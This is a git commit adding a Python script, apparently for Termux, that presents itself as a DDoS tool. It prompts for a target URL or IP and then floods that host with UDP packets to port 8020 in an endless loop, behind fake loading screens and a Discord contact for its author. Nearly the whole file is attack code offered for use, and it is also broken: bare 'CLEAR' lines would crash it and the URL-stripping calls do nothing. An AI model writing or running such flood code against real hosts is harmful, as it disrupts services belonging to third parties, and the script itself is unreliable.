59a426bc29ae8082ec0204d5ff0756b40581e2a2
zrafei <84282816+zrafei@users.noreply.github.com>
2021-08-02 08:40:02 +0300

    Create frosttool.py

---
+++ frosttool.py
@@ -0,0 +1,42 @@
+import time
+import socket
+import os
+red='\033[31m'
+green='\033[32m'
+os.system("pkg install toilet -y ")
+os.system("pkg install figlet -y ")
+os.system("clear")
+os.system("toilet -f mono12 -F metal DDOS.AMA")
+print(" ↦ Any problem? dm me zrafei#2021 on discord ")
+print(" Enjoy your tool ")
+print(" ➥==========================================➣")
+target = input(f"{green}Enter Target URL or IP NO ONE MESSES WİTH THİS GUY : ")
+target.replace("http://", "")
+target.replace("https://","")
+target.replace("www.","")
+ip = socket.gethostbyname(target)
+port = 8020
+joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
+os.system("clear")
+os.system("toilet Loading")
+print("Loading[IIIII]5%")
+time.sleep(3)
+CLEAR
+print("Loading[IIIIIIIII]26%")
+time.sleep(4)
+CLEAR
+print("Loading{IIIIIIIIIIIIIII}68%")
+time.sleep(5)
+CLEAR
+print("Loading[IIIIIIIIIIIIIIIIIIII]87%")
+time.sleep(6)
+CLEAR
+print("•→START←•")
+time.sleep(2)
+print("Loading{~ }100%")
+os.system("clear")
+os.system("figlet Attack_Starting")
+while True:
+     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
+     print(port,"sending pack to : ",ip)
